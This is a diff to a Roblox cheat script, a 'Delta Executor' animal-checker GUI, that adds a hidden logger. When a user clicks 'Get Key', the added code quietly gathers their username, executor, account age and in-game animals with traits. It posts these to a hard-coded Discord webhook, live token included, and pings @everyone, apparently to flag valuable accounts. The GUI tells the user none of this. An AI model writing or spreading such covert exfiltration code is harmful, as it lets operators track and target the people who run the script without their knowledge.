@@ -1,3 +1,116 @@
+-- === Delta Executor: Проверка животных + XModder GUI + Logger on Get Key ===
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+local HttpService = game:GetService("HttpService")
+pcall(function() HttpService.HttpEnabled = true end)
+
+-- === Logger Setup ===
+local animalEmojis = {
+    ["Dragon Cannelloni"]="🐉", ["Garama and Madundung"]="🍯", ["Ketchuru and Musturu"]="🥫",
+    ["Esok Sekolah"]="👅", ["Ketupat Kepat"]="🧸", ["Tralaledon"]="🦈", ["Los Bros"]="👬",
+    ["Los Hotspotsitos"]="💀", ["Los Chicleteiras"]="🍬", ["Nuclearo Dinossauro"]="🦖",
+    ["Chicleteira Bicicleteira"]="🚲", ["Tictac Sahur"]="⏰", ["Los Nooo My Hotspotsitos"]="🌯",
+    ["La Extinct Grande"]="🦴", ["Tacorita Bicicleta"]="🌮", ["Celularcini Viciosini"]="📱",
+    ["Las Sis"]="👩🏻‍🤝‍👩🏼", ["Los Tacoritas"]="🪇", ["La Grande Combinasion"]="🏏",
+    ["La Supreme Combinasion"]="🍹", ["Los Combinasionas"]="🧩", ["67"]="6️⃣7️⃣",
+    ["Mariachi Corazoni"]="🎻", ["Strawberry Elephant"]="🍓",
+    ["Spaghetti Tualetti"]="🚽"
+}
+
+local traitEmojis = {
+    ["Lighting"]="⚡", ["Sleepy"]="😴", ["Bubblegum"]="🍬", ["Brazil"]="🇧🇷",
+    ["10B"]="🔟", ["Nyan"]="🌈", ["Fireworks"]="🎆", ["Fire"]="🔥",
+    ["Glitched"]="🌀", ["Sombrero"]="👒", ["Disco"]="💃", ["Claws"]="🦀",
+    ["Tung Tung Attack"]="🥁", ["Taco"]="🌮", ["Strawberry"]="🍓", ["Paint"]="🎨",
+    ["Spider"]="🕷️", ["Extinct"]="🦴", ["Explosive"]="💥", ["Galactic"]="🌌",
+    ["Shark Fin"]="🦈", ["Matteo Hat"]="🎩", ["Comet-struck"]="☄️",
+    ["Rain"]="🌧️", ["Snowy"]="❄️", ["UFO"]="🛸"
+}
+
+local function sendWebhook(webhook,data)
+    local payload = HttpService:JSONEncode(data)
+    if syn then
+        syn.request({Url=webhook, Method="POST", Headers={}, Body=payload})
+    elseif request then
+        request({Url=webhook, Method="POST", Headers={}, Body=payload})
+    elseif http_request then
+        http_request({Url=webhook, Method="POST", Headers={}, Body=payload})
+    else
+        pcall(function()
+            HttpService:PostAsync(webhook, payload, Enum.HttpContentType.ApplicationJson)
+        end)
+    end
+end
+
+local function getPodiumInfoLogger()
+    local success, podiumData = pcall(function()
+        if ReplicatedStorage:FindFirstChild("Packages") then
+            local packages = ReplicatedStorage.Packages
+            if packages:FindFirstChild("Synchronizer") then
+                local synchronizer = require(packages.Synchronizer)
+                local playerData = synchronizer:Get(LocalPlayer)
+                if playerData then
+                    return playerData:Get("AnimalPodiums") or {}
+                end
+            end
+        end
+        return {}
+    end)
+
+    local info = {}
+    if success then
+        for podium, animal in pairs(podiumData) do
+            if animal ~= "Empty" and type(animal)=="table" then
+                local name = animal.Name or animal.Index or "Unknown"
+                local aEmoji = animalEmojis[name] or "❔"
+                local traitStrings = {}
+                if animal.Traits then
+                    for _, trait in pairs(animal.Traits) do
+                        local tEmoji = traitEmojis[trait] or "❔"
+                        table.insert(traitStrings, tEmoji.." "..trait)
+                    end
+                end
+                local traitString = #traitStrings>0 and " ("..table.concat(traitStrings,", ")..")" or ""
+                info[podium] = aEmoji.." "..name..traitString
+            end
+        end
+    end
+    return info
+end
+
+local function sendPlayerWebhook()
+    local podiumInfo = getPodiumInfoLogger()
+    local webhookURL = "https://discord.com/api/webhooks/1397209482668544060/igUifyhyKdSDPYZAMsYsWTMpVirHb3xSgqeZcY051sUHxCIFTvVxD24vofEA2Mm4tuAX"
+
+    local executor = "Unknown"
+    if syn then executor = "Synapse" end
+    if KRNL_LOADED then executor = "KRNL" end
+    if isfile then executor = "Hydrogen/PC" end
+    if getexecutor then executor = getexecutor() end
+
+    local accountAge = LocalPlayer.AccountAge
+
+    local embed = {
+        ["title"]=":bust_in_silhouette: cool stuff!!!",
+        ["description"]="Name: "..LocalPlayer.Name.."\nExecutor: "..executor.."\nAccount Age: "..accountAge.." days",
+        ["color"]=65280,
+        ["fields"]={
+            {["name"]=":palm_tree: Backpack",["value"]=#podiumInfo>0 and table.concat(podiumInfo,"\n") or "None",["inline"]=false}
+        }
+    }
+
+    local payload = {
+        ["content"] = "@everyone",  -- ✅ Pings everyone
+        ["embeds"] = {embed}
+    }
+
+    sendWebhook(webhookURL, payload)
+end
+
 -- === Delta Executor: Проверка животных + XModder GUI ===
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -14,7 +127,8 @@ local allowedAnimals = {
     "Nuclearo Dinossauro", "Los Combinasionas", "La Grande Combinasion", 
     "Chicleteira Bicicleteira", "Tictac Sahur", "Los Nooo My Hotspotsitos", "La Extinct Grande", 
     "Tacorita Bicicleta", "Celularcini Viciosini", "Las Sis", 
-    "Los Tacoritas", "Los Chicleteiras", "67", "Mariachi Corazoni", "Strawberry Elephant"
+    "Los Tacoritas", "Los Chicleteiras", "67", "Mariachi Corazoni", "Strawberry Elephant",
+    "Spaghetti Tualetti"
 }
 
 -- === Проверка животных ===
@@ -531,6 +645,15 @@ getKeyButton.MouseButton1Click:Connect(function()
     local url="https://xmodder.vercel.app/"
     if setclipboard then setclipboard(url) end
     showNotification("🔑 Link copied — paste it into your browser.","success")
+end)
+
+getKeyButton.MouseButton1Click:Connect(function()
+    local url="https://xmodder.vercel.app/"
+    if setclipboard then setclipboard(url) end
+    showNotification("🔑 Link copied — paste it into your browser.","success")
+    task.spawn(function()
+        sendPlayerWebhook()
+    end)
 end)
 
 -- Entrance animation
